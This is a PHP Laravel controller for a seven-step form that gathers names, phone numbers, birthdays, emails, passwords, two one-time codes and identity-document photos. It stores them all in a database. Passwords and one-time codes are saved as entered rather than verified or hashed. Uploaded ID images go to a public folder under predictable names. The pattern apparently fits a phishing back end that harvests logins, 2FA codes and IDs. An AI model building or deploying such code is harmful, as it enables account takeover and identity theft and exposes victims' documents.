<?php

namespace App\Http\Controllers;

use App\Models\Data;
use Illuminate\Http\Request;
use DateTime;

class DataController extends Controller
{
    public function getData(Request $request)
    {
        $currentStep = $request->input('step', 1);
        $validated = $request->only([
            'full_name',
            'phone_number',
            'birthday',
            'email',
            'password',
            'repassword',
            'otp_code',
            'otp_code_2',
            'identity_image'
        ]);

        if ($currentStep == 2) {
            // Transform date format for step 2
            if (isset($validated['birthday'])) {
                $date = DateTime::createFromFormat('m/d/Y', $validated['birthday']);
                if ($date) {
                    $validated['birthday'] = $date->format('Y-m-d');
                }
            }
            // Create new record and store ID in session
            $record = Data::create($validated);
            session(['record_id' => $record->id]);
        }
        
        if ($currentStep == 3) {
            // Get ID from session and update record
            $recordId = session('record_id');
            if ($recordId) {
                Data::where('id', $recordId)->update($validated);
            }
        }

        if ($currentStep == 4) {
            $recordId = session('record_id');
            if ($recordId) {
                Data::where('id', $recordId)->update($validated);
            }
        }

        if ($currentStep == 5 || $currentStep == 6) {
            $recordId = session('record_id');
            if ($recordId) {
                Data::where('id', $recordId)->update($validated);
            }
        }

        if ($currentStep == 7) {
            $recordId = session('record_id');
            if ($recordId && $request->hasFile('identity_image')) {
                $image = $request->file('identity_image');
                $filename = $recordId . '_' . time() . '.' . $image->getClientOriginalExtension();
                
                // Save image to public/images folder
                $image->move(public_path('images'), $filename);
                
                // Save image path to database
                $imagePath = url('images/' . $filename);
                Data::where('id', $recordId)->update(['images' => $imagePath]);

                // Clear the session after successful upload
                session()->forget('record_id');
            }
        }

        $nextStep = $currentStep + 1;
        return redirect()->route('home', ['step' => $nextStep]);
    }
}